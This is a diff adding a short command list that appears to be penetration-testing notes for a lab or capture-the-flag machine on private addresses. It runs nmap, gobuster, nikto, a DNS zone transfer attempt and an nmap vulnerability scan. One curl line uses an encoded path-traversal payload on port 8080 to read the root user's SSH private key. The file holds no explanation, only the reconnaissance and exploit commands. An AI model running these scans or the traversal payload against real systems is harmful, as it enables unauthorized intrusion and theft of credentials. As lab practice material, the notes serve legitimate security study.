@@ -1,0 +1,17 @@
+nmap -sV -sC -Pn 192.168.236.62 > nmap.txt
+nmap -p- 192.168.236.62 > nmapall.txt
+nmap -sU 192.168.93.62 > nmapuu.txt
+
+gobuster dir  -u http://192.168.236.62  -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+gobuster dir  -u http://192.168.236.62  -w /usr/share/dirb/wordlists/common.txt -x txt,php  -s "200,204,302,307,401,403" > gobusterhttp.txt
+gobuster dir  -u http://192.168.93.62/contact/  -w /usr/share/dirb/wordlists/common.txt -x txt,php  -s "200,204,302,307,401,403" > gobustercontact.txt
+
+curl http://192.168.236.62:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
+
+
+dig axfr @192.168.236.62
+
+nmap --script vuln -sV -p 22,53,80,4505,4506,8000 -Pn  192.168.236.62  > nmapvuln.txt
+
+
+nikto -h http://192.168.236.62 > nikto.txt
